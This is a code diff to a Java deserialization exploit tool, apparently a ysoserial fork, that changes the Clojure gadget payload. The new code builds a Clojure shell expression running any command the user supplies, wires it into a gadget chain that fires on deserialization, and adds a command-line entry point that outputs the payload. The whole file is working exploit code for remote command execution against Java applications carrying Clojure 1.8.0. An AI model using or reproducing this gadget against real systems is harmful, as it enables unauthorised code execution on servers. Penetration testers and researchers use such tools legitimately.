@@ -1,6 +1,8 @@
 package A.R.ysogate.payloads.gadgets;
 
 
+import A.R.ysogate.Strings;
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import clojure.core$comp;
 import clojure.core$constantly;
 import clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a;
@@ -9,8 +11,8 @@ import clojure.main$eval_opt;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.ClojureUtil;
 
+import java.util.Arrays;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -31,10 +33,26 @@ import static A.R.ysogate.payloads.annotation.Authors.JACKOFMOSTTRADES;
  */
 @Dependencies({"org.clojure:clojure:1.8.0"})
 @Authors({JACKOFMOSTTRADES})
-public class Clojure implements ObjectPayload<Map<?, ?>> {
+public class Clojure extends PayloadRunner implements ObjectPayload<Map<?, ?>> {
 
 	public Map<?, ?> getObject(String command) throws Exception {
-		String              clojurePayload = ClojureUtil.makeClojurePayload(command);
+		//		final String[] execArgs = command.split(" ");
+//		final StringBuilder commandArgs = new StringBuilder();
+//		for (String arg : execArgs) {
+//			commandArgs.append("\" \"");
+//			commandArgs.append(arg);
+//		}
+//		commandArgs.append("\"");
+
+
+//		final String clojurePayload =
+//				String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)", commandArgs.substring(2));
+
+		String cmd = Strings.join(Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\").split(" ")), " ", "\"", "\"");
+
+		final String clojurePayload =
+		String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)", cmd);
+
 		Map<String, Object> fnMap          = new HashMap<String, Object>();
 		fnMap.put("hashCode", (new core$constantly()).invoke(Integer.valueOf(0)));
 		AbstractTableModel$ff19274a model = new AbstractTableModel$ff19274a();
@@ -47,5 +65,9 @@ public class Clojure implements ObjectPayload<Map<?, ?>> {
 						.invoke(clojurePayload)));
 		model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));
 		return targetMap;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(Clojure.class, args);
 	}
 }
